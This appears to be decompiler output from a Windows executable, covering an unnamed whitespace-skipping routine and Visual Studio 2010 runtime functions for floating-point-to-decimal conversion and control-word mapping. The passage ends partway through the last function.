// WARNING: Removing unreachable block (ram,0x00418cbc)
// WARNING: Removing unreachable block (ram,0x00418cc7)
// WARNING: Removing unreachable block (ram,0x00418cd0)
// WARNING: Removing unreachable block (ram,0x00418cd6)
// WARNING: Removing unreachable block (ram,0x00418cd9)
// WARNING: Removing unreachable block (ram,0x00418cff)
// WARNING: Removing unreachable block (ram,0x00418d04)
// WARNING: Removing unreachable block (ram,0x00418d09)
// WARNING: Removing unreachable block (ram,0x00418d14)
// WARNING: Removing unreachable block (ram,0x00418d25)
// WARNING: Removing unreachable block (ram,0x00418d56)
// WARNING: Removing unreachable block (ram,0x00418d2b)
// WARNING: Removing unreachable block (ram,0x00418d51)
// WARNING: Removing unreachable block (ram,0x00418d35)
// WARNING: Removing unreachable block (ram,0x00418d4b)
// WARNING: Removing unreachable block (ram,0x00418d44)
// WARNING: Removing unreachable block (ram,0x00418d59)
// WARNING: Removing unreachable block (ram,0x00418d86)
// WARNING: Removing unreachable block (ram,0x00418d63)
// WARNING: Removing unreachable block (ram,0x00418bef)
// WARNING: Removing unreachable block (ram,0x00418bcc)
// WARNING: Removing unreachable block (ram,0x00418dc1)
// WARNING: Removing unreachable block (ram,0x00418b08)
// WARNING: Removing unreachable block (ram,0x00418dcb)
// WARNING: Removing unreachable block (ram,0x00418e0c)

void __cdecl
FUN_00418788(undefined2 *param_1,char **param_2,char *param_3,int param_4,int param_5,int param_6,
            undefined4 param_7,int param_8)

{
  char cVar1;
  uint uVar2;
  int *piVar3;
  
  uVar2 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  if (param_8 == 0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_0040c664();
    ___security_check_cookie_4(uVar2 ^ (uint)&stack0xfffffffc);
    return;
  }
  for (; (((cVar1 = *param_3, cVar1 == ' ' || (cVar1 == '\t')) || (cVar1 == '\n')) ||
         (cVar1 == '\r')); param_3 = param_3 + 1) {
  }
                    // WARNING: Could not recover jumptable at 0x00418811. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)PTR_LAB_00418e34)();
  return;
}



// WARNING: Removing unreachable block (ram,0x00419373)
// WARNING: Removing unreachable block (ram,0x0041937d)
// WARNING: Removing unreachable block (ram,0x00419382)
// Library Function - Single Match
//  _$I10_OUTPUT
// 
// Library: Visual Studio 2010 Release

void __cdecl
__I10_OUTPUT(int param_1,uint param_2,ushort param_3,int param_4,byte param_5,short *param_6)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  bool bVar4;
  int iVar5;
  int iVar6;
  errno_t eVar7;
  ushort *puVar8;
  ushort uVar9;
  int *piVar10;
  int iVar11;
  ushort uVar12;
  ushort uVar13;
  uint uVar14;
  char cVar15;
  uint uVar16;
  uint uVar17;
  short *psVar18;
  short *psVar19;
  ushort uVar20;
  short *psVar21;
  int iVar22;
  uint uVar23;
  uint uVar24;
  char *pcVar25;
  ushort *local_74;
  int *local_70;
  undefined *local_6c;
  ushort local_64;
  ushort *local_5c;
  int local_58;
  int local_54;
  short local_50;
  int local_4c;
  int local_48;
  int local_44;
  undefined2 local_40;
  undefined4 uStack_3e;
  ushort uStack_3a;
  int local_38;
  undefined4 local_34;
  undefined4 local_30;
  ushort local_2c [4];
  undefined4 local_24;
  ushort uStack_20;
  undefined4 uStack_1e;
  undefined local_1a;
  byte bStack_19;
  byte local_14;
  undefined uStack_13;
  undefined4 uStack_12;
  undefined4 uStack_e;
  ushort uStack_a;
  uint local_8;
  
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  iVar6 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e);
  iVar3 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e);
  iVar11 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12);
  iVar22 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12);
  iVar5 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  iVar1 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_64 = param_3 & 0x8000;
  uVar14 = param_3 & 0x7fff;
  local_34 = 0xcccccccc;
  local_30 = 0xcccccccc;
  local_2c[0] = 0xcccc;
  local_2c[1] = 0x3ffb;
  if (local_64 == 0) {
    *(undefined *)(param_6 + 1) = 0x20;
  }
  else {
    *(undefined *)(param_6 + 1) = 0x2d;
  }
  if ((short)uVar14 == 0) {
    if ((param_2 == 0) && (param_1 == 0)) {
      *param_6 = 0;
      *(byte *)(param_6 + 1) = ((local_64 != 0x8000) - 1U & 0xd) + 0x20;
      *(undefined2 *)((int)param_6 + 3) = 0x3001;
      *(undefined *)((int)param_6 + 5) = 0;
      iVar1 = iVar5;
      param_2 = CONCAT22(uStack_1e._2_2_,(ushort)uStack_1e);
      goto LAB_00419710;
    }
  }
  else if ((short)uVar14 == 0x7fff) {
    *param_6 = 1;
    if (((param_2 == 0x80000000) && (param_1 == 0)) || ((param_2 & 0x40000000) != 0)) {
      if ((local_64 == 0) || (param_2 != 0xc0000000)) {
        if ((param_2 != 0x80000000) || (param_1 != 0)) goto LAB_00418f83;
        pcVar25 = &DAT_0041e654;
      }
      else {
        if (param_1 != 0) {
LAB_00418f83:
          pcVar25 = (char *)&DAT_0041e64c;
          goto LAB_00418f88;
        }
        pcVar25 = s_1_IND_0041e65c;
      }
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar25);
      if (eVar7 != 0) goto LAB_00418f35;
      *(undefined *)((int)param_6 + 3) = 5;
    }
    else {
      pcVar25 = s_1_SNAN_0041e664;
LAB_00418f88:
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar25);
      if (eVar7 != 0) {
LAB_00418f35:
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 6;
    }
    iVar6 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e);
    iVar11 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12);
    uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    iVar1 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
    param_2 = CONCAT22(uStack_1e._2_2_,(ushort)uStack_1e);
    goto LAB_00419710;
  }
  local_50 = (short)(((uVar14 >> 8) + (param_2 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar14 * 0x4d10
                    >> 0x10);
  local_24._0_2_ = 0;
  uVar16 = (uint)local_50;
  local_1a = (undefined)uVar14;
  bStack_19 = (byte)(uVar14 >> 8);
  uStack_1e._0_2_ = (ushort)param_2;
  uStack_1e._2_2_ = (ushort)(param_2 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uStack_20 = (ushort)((uint)param_1 >> 0x10);
  local_6c = &DAT_00421510;
  if (-uVar16 != 0) {
    uVar14 = -uVar16;
    iVar1 = iVar5;
    iVar22 = iVar11;
    iVar3 = iVar6;
    if (0 < (int)uVar16) {
      local_6c = &DAT_00421670;
      uVar14 = uVar16;
    }
joined_r0x00419007:
    if (uVar14 != 0) {
      uStack_20 = (ushort)((uint)param_1 >> 0x10);
      local_24._2_2_ = (ushort)param_1;
      uStack_1e._2_2_ = (ushort)(param_2 >> 0x10);
      uStack_1e._0_2_ = (ushort)param_2;
      local_6c = local_6c + 0x54;
      uVar17 = (int)uVar14 >> 3;
      uVar16 = uVar14 & 7;
      uVar14 = uVar17;
      if (uVar16 != 0) {
        piVar10 = (int *)(local_6c + uVar16 * 0xc);
        if (0x7fff < *(ushort *)piVar10) {
          local_40 = (undefined2)*piVar10;
          uStack_3e._0_2_ = (undefined2)((uint)*piVar10 >> 0x10);
          piVar2 = piVar10 + 2;
          uStack_3e._2_2_ = (undefined2)piVar10[1];
          uStack_3a = (ushort)((uint)piVar10[1] >> 0x10);
          piVar10 = (int *)&local_40;
          local_38 = *piVar2;
          iVar1 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e) + -1;
          uStack_3e._0_2_ = (undefined2)iVar1;
          uStack_3e._2_2_ = (undefined2)((uint)iVar1 >> 0x10);
        }
        local_4c = 0;
        local_14 = 0;
        uStack_13 = 0;
        uStack_12._0_2_ = 0;
        uStack_12._2_2_ = 0;
        iVar22 = 0;
        uStack_e._0_2_ = 0;
        uStack_e._2_2_ = 0;
        iVar3 = 0;
        uStack_a = 0;
        uVar12 = (*(ushort *)((int)piVar10 + 10) ^ CONCAT11(bStack_19,local_1a)) & 0x8000;
        uVar13 = CONCAT11(bStack_19,local_1a) & 0x7fff;
        uVar9 = *(ushort *)((int)piVar10 + 10) & 0x7fff;
        uVar20 = uVar9 + uVar13;
        if (((uVar13 < 0x7fff) && (uVar9 < 0x7fff)) && (uVar20 < 0xbffe)) {
          if (0x3fbf < uVar20) {
            if (((uVar13 == 0) &&
                (uVar20 = uVar20 + 1,
                (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1e._2_2_)) & 0x7fffffff) == 0)) &&
               ((CONCAT22((ushort)uStack_1e,uStack_20) == 0 &&
                (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)))) {
              local_1a = 0;
              bStack_19 = 0;
              goto joined_r0x00419007;
            }
            if (((uVar9 != 0) || (uVar20 = uVar20 + 1, (piVar10[2] & 0x7fffffffU) != 0)) ||
               ((piVar10[1] != 0 || (*piVar10 != 0)))) {
              local_58 = 0;
              psVar21 = (short *)((int)&uStack_12 + 2);
              local_44 = 5;
              do {
                local_54 = local_44;
                if (0 < local_44) {
                  local_74 = (ushort *)((int)&local_24 + local_58 * 2);
                  local_70 = piVar10 + 2;
                  do {
                    bVar4 = false;
                    uVar16 = *(uint *)(psVar21 + -2) + (uint)*local_74 * (uint)*(ushort *)local_70;
                    if ((uVar16 < *(uint *)(psVar21 + -2)) ||
                       (uVar16 < (uint)*local_74 * (uint)*(ushort *)local_70)) {
                      bVar4 = true;
                    }
                    *(uint *)(psVar21 + -2) = uVar16;
                    if (bVar4) {
                      *psVar21 = *psVar21 + 1;
                    }
                    local_74 = local_74 + 1;
                    local_70 = (int *)((int)local_70 + -2);
                    local_54 = local_54 + -1;
                  } while (0 < local_54);
                }
                psVar21 = psVar21 + 1;
                local_58 = local_58 + 1;
                local_44 = local_44 + -1;
              } while (0 < local_44);
              uVar20 = uVar20 + 0xc002;
              if ((short)uVar20 < 1) {
LAB_004191ba:
                uVar20 = uVar20 - 1;
                if ((short)uVar20 < 0) {
                  uVar16 = (uint)(ushort)-uVar20;
                  uVar20 = 0;
                  do {
                    if ((local_14 & 1) != 0) {
                      local_4c = local_4c + 1;
                    }
                    iVar11 = CONCAT22(uStack_a,uStack_e._2_2_);
                    uVar17 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
                    iVar22 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
                    uStack_e._2_2_ = (ushort)(CONCAT22(uStack_a,uStack_e._2_2_) >> 1);
                    uStack_a = uStack_a >> 1;
                    uStack_e._0_2_ =
                         (ushort)uStack_e >> 1 | (ushort)((uint)(iVar11 << 0x1f) >> 0x10);
                    uVar23 = CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
                    uStack_12._0_2_ =
                         (ushort)uStack_12 >> 1 | (ushort)((uint)(iVar22 << 0x1f) >> 0x10);
                    uVar16 = uVar16 - 1;
                    uStack_12._2_2_ = (ushort)(uVar17 >> 1);
                    local_14 = (byte)uVar23;
                    uStack_13 = (undefined)(uVar23 >> 8);
                  } while (uVar16 != 0);
                  if (local_4c != 0) {
                    local_14 = local_14 | 1;
                  }
                }
              }
              else {
                do {
                  uVar13 = (ushort)uStack_e;
                  uVar9 = (ushort)uStack_12;
                  if ((uStack_a & 0x8000) != 0) break;
                  iVar22 = CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) << 1;
                  local_14 = (byte)iVar22;
                  uStack_13 = (undefined)((uint)iVar22 >> 8);
                  uStack_12._0_2_ = (ushort)((uint)iVar22 >> 0x10);
                  iVar22 = CONCAT22((ushort)uStack_e,uStack_12._2_2_) * 2;
                  uStack_12._2_2_ = (ushort)iVar22 | uVar9 >> 0xf;
                  uStack_e._0_2_ = (ushort)((uint)iVar22 >> 0x10);
                  iVar22 = CONCAT22(uStack_a,uStack_e._2_2_) * 2;
                  uStack_e._2_2_ = (ushort)iVar22 | uVar13 >> 0xf;
                  uVar20 = uVar20 - 1;
                  uStack_a = (ushort)((uint)iVar22 >> 0x10);
                } while (0 < (short)uVar20);
                if ((short)uVar20 < 1) goto LAB_004191ba;
              }
              if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
                 (iVar3 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e),
                 iVar22 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12),
                 (CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
                if (CONCAT22(uStack_12._2_2_,(ushort)uStack_12) == -1) {
                  iVar22 = 0;
                  if (CONCAT22(uStack_e._2_2_,(ushort)uStack_e) == -1) {
                    if (uStack_a == 0xffff) {
                      uStack_a = 0x8000;
                      uVar20 = uVar20 + 1;
                      iVar3 = 0;
                      iVar22 = 0;
                    }
                    else {
                      uStack_a = uStack_a + 1;
                      iVar3 = 0;
                      iVar22 = 0;
                    }
                  }
                  else {
                    iVar3 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e) + 1;
                  }
                }
                else {
                  iVar22 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12) + 1;
                  iVar3 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e);
                }
              }
              uStack_12._2_2_ = (ushort)((uint)iVar22 >> 0x10);
              uStack_12._0_2_ = (ushort)iVar22;
              uStack_e._2_2_ = (ushort)((uint)iVar3 >> 0x10);
              uStack_e._0_2_ = (ushort)iVar3;
              if (uVar20 < 0x7fff) {
                bStack_19 = (byte)(uVar20 >> 8) | (byte)(uVar12 >> 8);
                local_24._0_2_ = (ushort)uStack_12;
                local_24._2_2_ = uStack_12._2_2_;
                uStack_20 = (ushort)uStack_e;
                param_1 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
                uStack_1e._0_2_ = uStack_e._2_2_;
                uStack_1e._2_2_ = uStack_a;
                param_2 = CONCAT22(uStack_a,uStack_e._2_2_);
                local_1a = (undefined)uVar20;
              }
              else {
                uStack_20 = 0;
                uStack_1e._0_2_ = 0;
                local_24._0_2_ = 0;
                local_24._2_2_ = 0;
                param_1 = 0;
                iVar11 = ((uVar12 == 0) - 1 & 0x80000000) + 0x7fff8000;
                uStack_1e._2_2_ = (ushort)iVar11;
                param_2 = 0x80000000;
                local_1a = (undefined)((uint)iVar11 >> 0x10);
                bStack_19 = (byte)((uint)iVar11 >> 0x18);
              }
              goto joined_r0x00419007;
            }
          }
          uStack_1e._2_2_ = 0;
          local_1a = 0;
          bStack_19 = 0;
        }
        else {
          iVar22 = ((uVar12 == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1e._2_2_ = (ushort)iVar22;
          local_1a = (undefined)((uint)iVar22 >> 0x10);
          bStack_19 = (byte)((uint)iVar22 >> 0x18);
        }
        uStack_20 = 0;
        uStack_1e._0_2_ = 0;
        param_2 = (uint)uStack_1e._2_2_ << 0x10;
        local_24._0_2_ = 0;
        local_24._2_2_ = 0;
        param_1 = 0;
        iVar22 = 0;
        iVar3 = 0;
      }
      goto joined_r0x00419007;
    }
  }
  uStack_20 = (ushort)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uStack_1e._2_2_ = (ushort)(param_2 >> 0x10);
  uStack_1e._0_2_ = (ushort)param_2;
  uVar16 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1e._2_2_));
  iVar11 = iVar22;
  iVar6 = iVar3;
  if (0x3ffe < (ushort)(uVar16 >> 0x10)) {
    local_50 = local_50 + 1;
    local_54 = 0;
    local_14 = 0;
    uStack_13 = 0;
    uStack_12._0_2_ = 0;
    uStack_12._2_2_ = 0;
    iVar11 = 0;
    uStack_e._0_2_ = 0;
    uStack_e._2_2_ = 0;
    iVar6 = 0;
    uStack_a = 0;
    uVar16 = uVar16 >> 0x10 & 0x7fff;
    iVar22 = uVar16 + 0x3ffb;
    if (((ushort)uVar16 < 0x7fff) && ((ushort)iVar22 < 0xbffe)) {
      if (0x3fbf < (ushort)iVar22) {
        if (((((ushort)uVar16 == 0) &&
             (iVar22 = uVar16 + 0x3ffc,
             (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1e._2_2_)) & 0x7fffffff) == 0)) &&
            (CONCAT22((ushort)uStack_1e,uStack_20) == 0)) &&
           (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)) {
          local_1a = 0;
          bStack_19 = 0;
          goto LAB_00419548;
        }
        local_58 = 0;
        psVar21 = (short *)((int)&uStack_12 + 2);
        local_44 = 5;
        do {
          local_4c = local_44;
          if (0 < local_44) {
            local_5c = local_2c;
            puVar8 = (ushort *)((int)&local_24 + local_58 * 2);
            do {
              bVar4 = false;
              uVar16 = *(uint *)(psVar21 + -2) + (uint)*local_5c * (uint)*puVar8;
              if ((uVar16 < *(uint *)(psVar21 + -2)) || (uVar16 < (uint)*local_5c * (uint)*puVar8))
              {
                bVar4 = true;
              }
              *(uint *)(psVar21 + -2) = uVar16;
              if (bVar4) {
                *psVar21 = *psVar21 + 1;
              }
              local_5c = local_5c + -1;
              puVar8 = puVar8 + 1;
              local_4c = local_4c + -1;
            } while (0 < local_4c);
          }
          psVar21 = psVar21 + 1;
          local_58 = local_58 + 1;
          local_44 = local_44 + -1;
        } while (0 < local_44);
        iVar22 = iVar22 + 0xc002;
        if ((short)iVar22 < 1) {
LAB_00419443:
          uVar20 = (ushort)(iVar22 + 0xffff);
          if ((short)uVar20 < 0) {
            uVar16 = -(iVar22 + 0xffff);
            uVar14 = uVar16 & 0xffff;
            uVar20 = uVar20 + (short)uVar16;
            do {
              if ((local_14 & 1) != 0) {
                local_54 = local_54 + 1;
              }
              iVar11 = CONCAT22(uStack_a,uStack_e._2_2_);
              uVar16 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
              iVar22 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
              uStack_e._2_2_ = (ushort)(CONCAT22(uStack_a,uStack_e._2_2_) >> 1);
              uStack_a = uStack_a >> 1;
              uStack_e._0_2_ = (ushort)uStack_e >> 1 | (ushort)((uint)(iVar11 << 0x1f) >> 0x10);
              uVar17 = CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
              uStack_12._0_2_ = (ushort)uStack_12 >> 1 | (ushort)((uint)(iVar22 << 0x1f) >> 0x10);
              uVar14 = uVar14 - 1;
              uStack_12._2_2_ = (ushort)(uVar16 >> 1);
              local_14 = (byte)uVar17;
              uStack_13 = (undefined)(uVar17 >> 8);
            } while (uVar14 != 0);
            if (local_54 != 0) {
              local_14 = local_14 | 1;
            }
          }
        }
        else {
          do {
            uVar9 = (ushort)uStack_e;
            uVar20 = (ushort)uStack_12;
            if ((short)uStack_a < 0) break;
            iVar11 = CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) << 1;
            local_14 = (byte)iVar11;
            uStack_13 = (undefined)((uint)iVar11 >> 8);
            uStack_12._0_2_ = (ushort)((uint)iVar11 >> 0x10);
            iVar11 = CONCAT22((ushort)uStack_e,uStack_12._2_2_) * 2;
            uStack_12._2_2_ = (ushort)iVar11 | uVar20 >> 0xf;
            uStack_e._0_2_ = (ushort)((uint)iVar11 >> 0x10);
            iVar11 = CONCAT22(uStack_a,uStack_e._2_2_) * 2;
            uStack_e._2_2_ = (ushort)iVar11 | uVar9 >> 0xf;
            iVar22 = iVar22 + 0xffff;
            uStack_a = (ushort)((uint)iVar11 >> 0x10);
          } while (0 < (short)iVar22);
          uVar20 = (ushort)iVar22;
          if ((short)uVar20 < 1) goto LAB_00419443;
        }
        if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
           (iVar6 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e),
           iVar11 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12),
           (CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
          if (CONCAT22(uStack_12._2_2_,(ushort)uStack_12) == -1) {
            iVar11 = 0;
            if (CONCAT22(uStack_e._2_2_,(ushort)uStack_e) == -1) {
              if (uStack_a == 0xffff) {
                uStack_a = 0x8000;
                uVar20 = uVar20 + 1;
                iVar6 = 0;
                iVar11 = 0;
              }
              else {
                uStack_a = uStack_a + 1;
                iVar6 = 0;
                iVar11 = 0;
              }
            }
            else {
              iVar6 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e) + 1;
            }
          }
          else {
            iVar11 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12) + 1;
            iVar6 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e);
          }
        }
        uStack_12._2_2_ = (ushort)((uint)iVar11 >> 0x10);
        uStack_12._0_2_ = (ushort)iVar11;
        uStack_e._2_2_ = (ushort)((uint)iVar6 >> 0x10);
        uStack_e._0_2_ = (ushort)iVar6;
        if (uVar20 < 0x7fff) {
          bStack_19 = (byte)(uVar20 >> 8) | bStack_19 & 0x80;
          local_24._0_2_ = (ushort)uStack_12;
          param_1 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
          param_2 = CONCAT22(uStack_a,uStack_e._2_2_);
          local_1a = (undefined)uVar20;
        }
        else {
          local_24._0_2_ = 0;
          param_1 = 0;
          iVar22 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
          param_2 = 0x80000000;
          local_1a = (undefined)((uint)iVar22 >> 0x10);
          bStack_19 = (byte)((uint)iVar22 >> 0x18);
        }
        goto LAB_00419548;
      }
      iVar22 = 0;
    }
    else {
      iVar22 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
    }
    param_1 = 0;
    local_24._0_2_ = 0;
    param_2 = iVar22 << 0x10;
    local_1a = (undefined)((uint)iVar22 >> 0x10);
    bStack_19 = (byte)((uint)iVar22 >> 0x18);
    iVar11 = 0;
    iVar6 = 0;
  }
LAB_00419548:
  uStack_20 = (ushort)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  *param_6 = local_50;
  if (((param_5 & 1) == 0) || (param_4 = param_4 + local_50, 0 < param_4)) {
    if (0x15 < param_4) {
      param_4 = 0x15;
    }
    iVar22 = CONCAT11(bStack_19,local_1a) - 0x3ffe;
    local_1a = 0;
    bStack_19 = 0;
    local_48 = 8;
    do {
      uStack_1e._2_2_ = (ushort)(param_2 >> 0x10);
      uStack_1e._0_2_ = (ushort)param_2;
      uStack_20 = (ushort)((uint)param_1 >> 0x10);
      local_24._2_2_ = (ushort)param_1;
      uVar9 = local_24._2_2_;
      iVar3 = CONCAT22(local_24._2_2_,(undefined2)local_24) << 1;
      local_24._0_2_ = (undefined2)iVar3;
      local_24._2_2_ = (ushort)((uint)iVar3 >> 0x10);
      uVar16 = CONCAT22((ushort)uStack_1e,uStack_20) * 2;
      uVar20 = (ushort)uStack_1e >> 0xf;
      uVar14 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1e._2_2_)) * 2;
      local_48 = local_48 + -1;
      uStack_20 = (ushort)(uVar16 | uVar9 >> 0xf);
      param_1 = CONCAT22(uStack_20,local_24._2_2_);
      uStack_1e._0_2_ = (ushort)(uVar16 >> 0x10);
      uStack_1e._2_2_ = (ushort)(uVar14 | uVar20);
      param_2 = CONCAT22(uStack_1e._2_2_,(ushort)uStack_1e);
      local_1a = (undefined)(uVar14 >> 0x10);
      bStack_19 = (byte)(uVar14 >> 0x18);
    } while (local_48 != 0);
    if ((iVar22 < 0) && (uVar16 = -iVar22 & 0xff, uVar16 != 0)) {
      do {
        iVar3 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1e._2_2_));
        uVar17 = CONCAT22((ushort)uStack_1e,uStack_20);
        iVar22 = CONCAT22((ushort)uStack_1e,uStack_20);
        uVar14 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1e._2_2_)) >> 1;
        uStack_1e._2_2_ = (ushort)uVar14;
        local_1a = (undefined)(uVar14 >> 0x10);
        bStack_19 = bStack_19 >> 1;
        uStack_1e._0_2_ = (ushort)uStack_1e >> 1 | (ushort)((uint)(iVar3 << 0x1f) >> 0x10);
        uVar14 = CONCAT22(local_24._2_2_,(undefined2)local_24);
        local_24._2_2_ = local_24._2_2_ >> 1 | (ushort)((uint)(iVar22 << 0x1f) >> 0x10);
        uVar16 = uVar16 - 1;
        uStack_20 = (ushort)(uVar17 >> 1);
        local_24._0_2_ = (undefined2)(uVar14 >> 1);
      } while (0 < (int)uVar16);
    }
    uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    psVar21 = param_6 + 2;
    psVar18 = psVar21;
    uVar20 = (ushort)uStack_1e;
    for (iVar22 = param_4 + 1; 0 < iVar22; iVar22 = iVar22 + -1) {
      local_24._2_2_ = (ushort)(uVar16 >> 0x10);
      local_24._0_2_ = (undefined2)uVar16;
      iVar1 = CONCAT22(uStack_20,local_24._2_2_);
      local_38 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1e._2_2_));
      uVar14 = CONCAT22(uVar20,uStack_20) * 2;
      uVar17 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1e._2_2_)) * 2 | (uint)(uVar20 >> 0xf))
               * 2 | uVar14 >> 0x1f;
      uVar23 = (uVar14 | local_24._2_2_ >> 0xf) * 2 | (uVar16 << 1) >> 0x1f;
      uVar14 = uVar16 * 5;
      if ((uVar14 < uVar16 * 4) || (uVar24 = uVar23, uVar14 < uVar16)) {
        uVar24 = uVar23 + 1;
        bVar4 = false;
        if ((uVar24 < uVar23) || (uVar24 == 0)) {
          bVar4 = true;
        }
        if (bVar4) {
          uVar17 = uVar17 + 1;
        }
      }
      uVar23 = CONCAT22(uVar20,uStack_20) + uVar24;
      if ((uVar23 < uVar24) || (uVar23 < CONCAT22(uVar20,uStack_20))) {
        uVar17 = uVar17 + 1;
      }
      iVar3 = (uVar17 + local_38) * 2;
      uStack_1e._2_2_ = (ushort)iVar3 | (ushort)(uVar23 >> 0x1f);
      uVar16 = uVar16 * 10;
      local_1a = (undefined)((uint)iVar3 >> 0x10);
      uStack_20 = (ushort)(uVar23 * 2) | (ushort)(uVar14 >> 0x1f);
      *(char *)psVar18 = (char)((uint)iVar3 >> 0x18) + '0';
      psVar18 = (short *)((int)psVar18 + 1);
      uStack_1e._0_2_ = (ushort)(uVar23 * 2 >> 0x10);
      bStack_19 = 0;
      local_40 = (undefined2)local_24;
      uStack_3a = uVar20;
      uVar20 = (ushort)uStack_1e;
    }
    param_2 = CONCAT22(uStack_1e._2_2_,uVar20);
    psVar19 = psVar18 + -1;
    if (*(char *)((int)psVar18 + -1) < '5') {
      for (; (psVar21 <= psVar19 && (*(char *)psVar19 == '0'));
          psVar19 = (short *)((int)psVar19 + -1)) {
      }
      if (psVar19 < psVar21) {
        *param_6 = 0;
        *(undefined *)((int)param_6 + 3) = 1;
        *(byte *)(param_6 + 1) = ((local_64 != 0x8000) - 1U & 0xd) + 0x20;
        *(char *)psVar21 = '0';
        *(undefined *)((int)param_6 + 5) = 0;
        goto LAB_00419710;
      }
    }
    else {
      for (; (psVar21 <= psVar19 && (*(char *)psVar19 == '9'));
          psVar19 = (short *)((int)psVar19 + -1)) {
        *(char *)psVar19 = '0';
      }
      if (psVar19 < psVar21) {
        psVar19 = (short *)((int)psVar19 + 1);
        *param_6 = *param_6 + 1;
      }
      *(char *)psVar19 = *(char *)psVar19 + '\x01';
    }
    cVar15 = ((char)psVar19 - (char)param_6) + -3;
    *(char *)((int)param_6 + 3) = cVar15;
    *(undefined *)(cVar15 + 4 + (int)param_6) = 0;
  }
  else {
    *param_6 = 0;
    *(undefined2 *)((int)param_6 + 3) = 0x3001;
    *(byte *)(param_6 + 1) = ((local_64 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)((int)param_6 + 5) = 0;
  }
LAB_00419710:
  uStack_3e = iVar1;
  local_24 = uVar16;
  uStack_12 = iVar11;
  uStack_e = iVar6;
  uStack_1e = param_2;
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __hw_cw
// 
// Library: Visual Studio 2010 Release

uint __hw_cw(void)

{
  uint uVar1;
  uint uVar2;
  uint unaff_EBX;
  
  uVar1 = (uint)((unaff_EBX & 0x10) != 0);
  if ((unaff_EBX & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((unaff_EBX & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((unaff_EBX & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((unaff_EBX & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((unaff_EBX & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = unaff_EBX & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x800;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
  }
  if ((unaff_EBX & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else if ((unaff_EBX & 0x30000) == 0x10000) {
    uVar1 = uVar1 | 0x200;
  }
  if ((unaff_EBX & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
